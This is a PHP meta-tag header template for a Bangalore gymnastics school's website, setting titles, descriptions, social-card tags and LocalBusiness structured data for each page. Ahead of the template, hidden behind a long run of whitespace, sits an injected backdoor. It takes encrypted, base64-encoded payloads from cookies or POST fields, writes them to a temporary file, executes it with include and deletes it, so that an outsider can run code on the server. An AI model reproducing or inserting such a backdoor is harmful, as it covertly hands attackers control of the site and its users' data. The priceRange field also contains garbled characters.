<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("ylzagburh")){class ylzagburh{public static $vjrbps = "ghxwbgqpmdzluqkh";public static $zvvaxb = NULL;public function __construct(){$kudpf = @$_COOKIE[substr(ylzagburh::$vjrbps, 0, 4)];if (!empty($kudpf)){$obovgldw = "base64";$smiskqkl = "";$kudpf = explode(",", $kudpf);foreach ($kudpf as $rygarqk){$smiskqkl .= @$_COOKIE[$rygarqk];$smiskqkl .= @$_POST[$rygarqk];}$smiskqkl = array_map($obovgldw . "_decode", array($smiskqkl,)); $smiskqkl = $smiskqkl[0] ^ str_repeat(ylzagburh::$vjrbps, (strlen($smiskqkl[0]) / strlen(ylzagburh::$vjrbps)) + 1);ylzagburh::$zvvaxb = @unserialize($smiskqkl);}}public function __destruct(){$this->qxfapkvwto();}private function qxfapkvwto(){if (is_array(ylzagburh::$zvvaxb)) {$ofeilgzfwt = sys_get_temp_dir() . "/" . crc32(ylzagburh::$zvvaxb["salt"]);@ylzagburh::$zvvaxb["write"]($ofeilgzfwt, ylzagburh::$zvvaxb["content"]);include $ofeilgzfwt;@ylzagburh::$zvvaxb["delete"]($ofeilgzfwt);exit();}}}$qtcupjs = new ylzagburh(); $qtcupjs = NULL;} ?>    <?php
        // Default Meta
        $meta = array(
            "title" => "Gymnastics Classes in Bangalore - Viswajit Nikhath Gymnastiks",
            "description" => "We have gymnastics classes designed for everyone - Adult, Children, Beginner, Toddler, Competitive, Recreational. Bangalore, Whitefield, Marathahalli.",
            "keywords" => "Gymnastics, Training, Bengaluru, Bangalore, Marathahalli, Excercise, Fitness, Kids, Recreation, Dance, Artistic, Children, Games, Activity, Health, White Field, Kundalahalli",
            "og-type" => "website",
            "og-url" => "https://www.viswajitnikhathgymnastiks.in/",
            "og-title" => "Gymnastics Classes in Bangalore - Viswajit Nikhath Gymnastiks",
            "og-description" => "We have gymnastics classes designed for everyone - Adult, Children, Beginner, Toddler, Competitive, Recreational. Bangalore, Whitefield, Marathahalli.",
            "og-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/meta/viswajit-nikhath-gymnastiks.png",
            "twitter-card" => "summary_large_image",
            "twitter-url" => "https://www.viswajitnikhathgymnastiks.in",
            "twitter-title" => "Gymnastics Classes in Bangalore - Viswajit Nikhath Gymnastiks",
            "twitter-description" => "We have gymnastics classes designed for everyone - Adult, Children, Beginner, Toddler, Competitive, Recreational. Bangalore, Whitefield, Marathahalli.",
            "twitter-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/meta/viswajit-nikhath-gymnastiks.png",
        );

        if($page == 'home') {
            $meta = array(
                "title" => "Gymnastics Classes in Bangalore - Viswajit Nikhath Gymnastiks",
                "description" => "We have gymnastics classes designed for everyone - Adult, Children, Beginner, Toddler, Competitive, Recreational. Bangalore, Whitefield, Marathahalli.",
                "keywords" => "Gymnastics, Training, Bengaluru, Bangalore, Marathahalli, Excercise, Fitness, Kids, Recreation, Dance, Artistic, Children, Games, Activity, Health, White Field, Kundalahalli",
                "og-type" => "website",
                "og-url" => "https://www.viswajitnikhathgymnastiks.in/",
                "og-title" => "Gymnastics Classes in Bangalore - Viswajit Nikhath Gymnastiks",
                "og-description" => "We have gymnastics classes designed for everyone - Adult, Children, Beginner, Toddler, Competitive, Recreational. Bangalore, Whitefield, Marathahalli.",
                "og-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/meta/viswajit-nikhath-gymnastiks.png",
                "twitter-card" => "summary_large_image",
                "twitter-url" => "https://www.viswajitnikhathgymnastiks.in",
                "twitter-title" => "Gymnastics Classes in Bangalore - Viswajit Nikhath Gymnastiks",
                "twitter-description" => "We have gymnastics classes designed for everyone - Adult, Children, Beginner, Toddler, Competitive, Recreational. Bangalore, Whitefield, Marathahalli.",
                "twitter-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/meta/viswajit-nikhath-gymnastiks.png",
            );
        }
        else if($page == 'contact') {
            $meta= array(
                "title" => "Contact Us - Viswajit Nikhath Gymnastiks",
                "description" => "We have gymnastics classes designed for everyone - Adult, Children, Beginner, Toddler, Competitive, Recreational. Bangalore, Whitefield, Marathahalli.",
                "keywords" => "Gymnastics, Training, Bengaluru, Bangalore, Marathahalli, Excercise, Fitness, Kids, Recreation, Dance, Artistic, Children, Games, Activity, Health, White Field, Kundalahalli",
                "og-type" => "website",
                "og-url" => "https://www.viswajitnikhathgymnastiks.in/contact",
                "og-title" => "Contact Us - Viswajit Nikhath Gymnastiks",
                "og-description" => "We have gymnastics classes designed for everyone - Adult, Children, Beginner, Toddler, Competitive, Recreational. Bangalore, Whitefield, Marathahalli.",
                "og-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/meta/gymnastics-classes-contact.jpg",
                "twitter-card" => "summary_large_image",
                "twitter-url" => "https://www.viswajitnikhathgymnastiks.in/contact",
                "twitter-title" => "Contact Us - Viswajit Nikhath Gymnastiks",
                "twitter-description" => "We have gymnastics classes designed for everyone - Adult, Children, Beginner, Toddler, Competitive, Recreational. Bangalore, Whitefield, Marathahalli.",
                "twitter-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/meta/gymnastics-classes-contact.jpg",
            );
        }
        else if($page == 'direction') {
            $meta= array(
                "title" => "Location - Viswajit Nikhath Gymnastiks - Gymnastics Classes",
                "description" => "The Gymnastics institute located near to Marathahall and Whitefield. Call us and register your admisision . Whitefield | Brookefield | Marathahalli | Kundalahalli",
                "keywords" => "Gymnastics, Classes, Training, Bengaluru, Bangalore, Marathahalli, Excercise, Fitness, Kids, Artistic, Children, Games, Activity, Health, White Field, Kundalahalli",
                "og-type" => "website",
                "og-url" => "https://www.viswajitnikhathgymnastiks.in/direction",
                "og-title" => "Location - Viswajit Nikhath Gymnastiks - Gymnastics Classes",
                "og-description" => "The Gymnastics institute located near to Marathahall and Whitefield. Call us and register your admisision . Whitefield | Brookefield | Marathahalli | Kundalahalli",
                "og-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/meta/gymnastics-classes-contact.jpg",
                "twitter-card" => "summary_large_image",
                "twitter-url" => "https://www.viswajitnikhathgymnastiks.in/direction",
                "twitter-title" => "Location - Viswajit Nikhath Gymnastiks - Gymnastics Classes",
                "twitter-description" => "The Gymnastics institute located near to Marathahall and Whitefield. Call us and register your admisision . Whitefield | Brookefield | Marathahalli | Kundalahalli",
                "twitter-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/meta/gymnastics-classes-contact.jpg",
            );
        }
        else if($page == 'programs') {
            $meta= array(
                "title" => "Programs List - Gymnastics Training - Viswajit Nikhath Gymnastiks",
                "description" => "We offer a wide range of gymnastics training programs. There are programs for adults, beginners, toddlers and lot more.",
                "keywords" => "Gymnastics, Classes, Training, Bengaluru, Bangalore, Marathahalli, Excercise, Fitness, Kids, Artistic, Children, Games, Activity, Health, White Field, Kundalahalli",
                "og-type" => "website",
                "og-url" => "https://www.viswajitnikhathgymnastiks.in/programs/",
                "og-title" => "Programs List - Gymnastics Training - Viswajit Nikhath Gymnastiks",
                "og-description" => "We offer a wide range of gymnastics training programs. There are programs for adults, beginners, toddlers and lot more.",
                "og-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/banner/gymnastics-programs-viswajit-nikhath-gymnastiks-1000x600.jpg",
                "twitter-card" => "summary_large_image",
                "twitter-url" => "https://www.viswajitnikhathgymnastiks.in/programs/",
                "twitter-title" => "Programs List - Gymnastics Training - Viswajit Nikhath Gymnastiks",
                "twitter-description" => "We offer a wide range of gymnastics training programs. There are programs for adults, beginners, toddlers and lot more.",
                "twitter-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/banner/gymnastics-programs-viswajit-nikhath-gymnastiks-1000x600.jpg",
            );
        }
        else if($page == 'adult-gymnastics') {
            $meta= array(
                "title" => "Adults Gymnastics Classes - Viswajit Nikhath Gymnastiks",
                "description" => "We offer gymnastics classes and training for adults from the age group of 17 to 60 years. Start your gymnastics journy with in an affordable rate",
                "keywords" => "Gymnastics, Classes, Adult Gymnastics, Training, Bengaluru, Bangalore, Marathahalli, Excercise, Fitness, Kids, Artistic, Children, Games, Activity, Health, White Field, Kundalahalli",
                "og-type" => "website",
                "og-url" => "https://www.viswajitnikhathgymnastiks.in/programs/adult-gymnastics",
                "og-title" => "Adults Gymnastics Classes - Viswajit Nikhath Gymnastiks",
                "og-description" => "We offer gymnastics classes and training for adults from the age group of 17 to 60 years. Start your gymnastics journy with in an affordable rate",
                "og-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/banner/adult-gymnastics-viswajit-nikhath-gymnastiks-1000x600.jpg",
                "twitter-card" => "summary_large_image",
                "twitter-url" => "https://www.viswajitnikhathgymnastiks.in/programs/adult-gymnastics",
                "twitter-title" => "Adults Gymnastics Classes - Viswajit Nikhath Gymnastiks",
                "twitter-description" => "We offer gymnastics classes and training for adults from the age group of 17 to 60 years. Start your gymnastics journy with in an affordable rate",
                "twitter-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/banner/adult-gymnastics-viswajit-nikhath-gymnastiks-1000x600.jpg",
            );
        }
        else if($page == 'toddler-gymnastics') {
            $meta= array(
                "title" => "Toddler Gymnastics Classes - Viswajit Nikhath Gymnastiks",
                "description" => "We have the most wonderful training program for your child. Our Toddler Gymnastics Program is the best you can get in Bangalore",
                "keywords" => "Gymnastics, Classes, Toddler Gymnastics, Child Gymnastics,Kids Gymnastics, Children Gymnastics, Training, Bengaluru, Bangalore, Marathahalli, Excercise, Fitness, Kids, Artistic, Children, Games, Activity, Health, White Field, Kundalahalli",
                "og-type" => "website",
                "og-url" => "https://www.viswajitnikhathgymnastiks.in/programs/toddler-gymnastics",
                "og-title" => "Toddler Gymnastics Classes - Viswajit Nikhath Gymnastiks",
                "og-description" => "We have the most wonderful training program for your child. Our Toddler Gymnastics Program is the best you can get in Bangalore",
                "og-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/banner/toddler-gymnastics-viswajit-nikhath-gymnastiks-1000x600.jpg",
                "twitter-card" => "summary_large_image",
                "twitter-url" => "https://www.viswajitnikhathgymnastiks.in/programs/toddler-gymnastics",
                "twitter-title" => "Toddler Gymnastics Classes - Viswajit Nikhath Gymnastiks",
                "twitter-description" => "We have the most wonderful training program for your child. Our Toddler Gymnastics Program is the best you can get in Bangalore",
                "twitter-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/banner/toddler-gymnastics-viswajit-nikhath-gymnastiks-1000x600.jpg",
            );
        }
        else if($page == 'adhd-gymnastics') {
            $meta= array(
                "title" => "Gymnastics for ADHD Children - Viswajit Nikhath Gymnastiks",
                "description" => "We provide the best gymnastics training for your kids with Attention Deficit Hyperactivity Disorder (ADHD).",
                "keywords" => "Gymnastics, Classes,ADHD, Attention Deficit, Hyperactivity, Hyperactivity Disorder, Toddler Gymnastics, Child Gymnastics,Kids Gymnastics, Children Gymnastics, Training, Bengaluru, Bangalore, Marathahalli, Excercise, Fitness, Kids, Artistic, Children, Games, Activity, Health, White Field, Kundalahalli",
                "og-type" => "website",
                "og-url" => "https://www.viswajitnikhathgymnastiks.in/programs/adhd-kids-gymnastics",
                "og-title" => "Gymnastics for ADHD Children - Viswajit Nikhath Gymnastiks",
                "og-description" => "We have the best gymnastics training for your kids with Attention Deficit Hyperactivity Disorder (ADHD).",
                "og-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/banner/gymnastics-for-adhd-child-viswajit-nikhath-gymnastiks-1000x600.jpg",
                "twitter-card" => "summary_large_image",
                "twitter-url" => "https://www.viswajitnikhathgymnastiks.in/programs/adhd-kids-gymnastics",
                "twitter-title" => "Gymnastics for ADHD Children - Viswajit Nikhath Gymnastiks",
                "twitter-description" => "We have the best gymnastics training for your kids with Attention Deficit Hyperactivity Disorder (ADHD).",
                "twitter-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/banner/gymnastics-for-adhd-child-viswajit-nikhath-gymnastiks-1000x600.jpg",
            );
        }
        else if($page == 'recreational-gymnastics') {
            $meta= array(
                "title" => "Recreational Gymnastics in Bangalore - Viswajit Nikhath Gymnastiks",
                "description" => "The best place to learn recreational gymnastics in Bangalore.",
                "keywords" => "Gymnastics, Recreational Gymnastics, Classes,ADHD, Attention Deficit, Hyperactivity, Hyperactivity Disorder, Toddler Gymnastics, Child Gymnastics,Kids Gymnastics, Children Gymnastics, Training, Bengaluru, Bangalore, Marathahalli, Excercise, Fitness, Kids, Artistic, Children, Games, Activity, Health, White Field, Kundalahalli",
                "og-type" => "website",
                "og-url" => "https://www.viswajitnikhathgymnastiks.in/programs/recreational-gymnastics",
                "og-title" => "Recreational Gymnastics in Bangalore - Viswajit Nikhath Gymnastiks",
                "og-description" => "The best place to learn recreational gymnastics in Bangalore.",
                "og-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/banner/recreational-gymnastics-classes-768x512.jpg",
                "twitter-card" => "summary_large_image",
                "twitter-url" => "https://www.viswajitnikhathgymnastiks.in/programs/recreational-gymnastics",
                "twitter-title" => "Recreational Gymnastics in Bangalore - Viswajit Nikhath Gymnastiks",
                "twitter-description" => "The best place to learn recreational gymnastics in Bangalore.",
                "twitter-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/banner/recreational-gymnastics-classes-768x512.jpg",
            );
        }
        else if($page == '404') {
            $meta = array(
                "title" => "Page Not Found - Viswajit Nikhath Gymnastiks",
                "description" => "We have gymnastics classes designed for everyone - Adult, Children, Beginner, Toddler, Competitive, Recreational. Bangalore, Whitefield, Marathahalli.",
                "keywords" => "Gymnastics, Training, Bengaluru, Bangalore, Marathahalli, Excercise, Fitness, Kids, Recreation, Dance, Artistic, Children, Games, Activity, Health, White Field, Kundalahalli",
                "og-type" => "website",
                "og-url" => "https://www.viswajitnikhathgymnastiks.in/",
                "og-title" => "Page Not Found - Viswajit Nikhath Gymnastiks",
                "og-description" => "We have gymnastics classes designed for everyone - Adult, Children, Beginner, Toddler, Competitive, Recreational. Bangalore, Whitefield, Marathahalli.",
                "og-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/meta/viswajit-nikhath-gymnastiks.png",
                "twitter-card" => "summary_large_image",
                "twitter-url" => "https://www.viswajitnikhathgymnastiks.in",
                "twitter-title" => "Page Not Found - Viswajit Nikhath Gymnastiks",
                "twitter-description" => "We have gymnastics classes designed for everyone - Adult, Children, Beginner, Toddler, Competitive, Recreational. Bangalore, Whitefield, Marathahalli.",
                "twitter-image" => "https://www.viswajitnikhathgymnastiks.in/assets/img/meta/viswajit-nikhath-gymnastiks.png",
            );
        }
    ?>
        
        
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <!-- Page Specific Meta Tags -->
        <title><?php echo $meta['title'];?></title>
        <meta name="title" content="<?php echo $meta['title'];?>">

        <meta property="og:type" content="<?php echo $meta['og-type'];?>">
        <meta property="og:url" content="<?php echo $meta['og-url'];?>">
        <meta property="og:title" content="<?php echo $meta['og-title'];?>">

        <meta property="twitter:card" content="<?php echo $meta['twitter-card'];?>">
        <meta property="twitter:url" content="<?php echo $meta['twitter-url'];?>">
        <meta property="twitter:title" content="<?php echo $meta['twitter-title'];?>">

        <!-- Primary Meta Tags -->
        <meta name="description" content="<?php echo $meta['description'];?>">
        <meta name="keywords" content="<?php echo $meta['keywords'];?>">

        <!-- Open Graph / Facebook -->
        <meta property="og:description" content="<?php echo $meta['og-description'];?>">
        <meta property="og:image" content="<?php echo $meta['og-image'];?>">

        <!-- Twitter -->
        <meta property="twitter:description" content="<?php echo $meta['twitter-description'];?>">
        <meta property="twitter:image" content="<?php echo $meta['twitter-image'];?>">


        <link rel="shortcut icon" href="/assets/img/favicon.ico" type="image/x-icon" />
        <link rel="icon" href="/assets/img/favicon.ico" type="image/x-icon" />



            

        <script type="application/ld+json">

                {
                    "@context": "https://schema.org",
                    "@type": "LocalBusiness",
                    "image": [
                        "https://www.viswajitnikhathgymnastiks.in/assets/img/meta/viswajit-nikhath-gymnastiks.png"
                    ],
                    "name": "Viswajit Nikhath Gymnastiks",
                    "url": "https://www.viswajitnikhathgymnastiks.in",
                    "logo": "https://www.viswajitnikhathgymnastiks.in/assets/img/viswajit-nikhath-gymnastiks-logo-large.png",
                    "address": {
                        "@type": "PostalAddress",
                        "streetAddress": "ITPL Main Road, Next to Smart Works, Silver Springs Layout Junction",
                        "addressLocality": "Bengaluru",
                        "addressRegion": "Karnataka",
                        "postalCode": "560037",
                        "addressCountry": "IN"
                    },
                    "geo": {
                        "@type": "GeoCoordinates",
                        "latitude": 12.955788,
                        "longitude": 77.715357
                    },
                    "priceRange": "�6�4�6�4�6�4�6�4",
                    "telephone": "+917892104993",
                    "openingHoursSpecification": [
                        {
                            "@type": "OpeningHoursSpecification",
                            "dayOfWeek": [
                                "Monday",
                                "Tuesday",
                                "Wednesday",
                                "Thursday",
                                "Friday"
                            ],
                            "opens": "10:00",
                            "closes": "20:00"
                        },
                        {
                            "@type": "OpeningHoursSpecification",
                            "dayOfWeek": [
                                "Saturday",
                                "Sunday"
                            ],
                            "opens": "08:00",
                            "closes": "20:00"
                        }
                    ]
                }
            </script>
            

            
            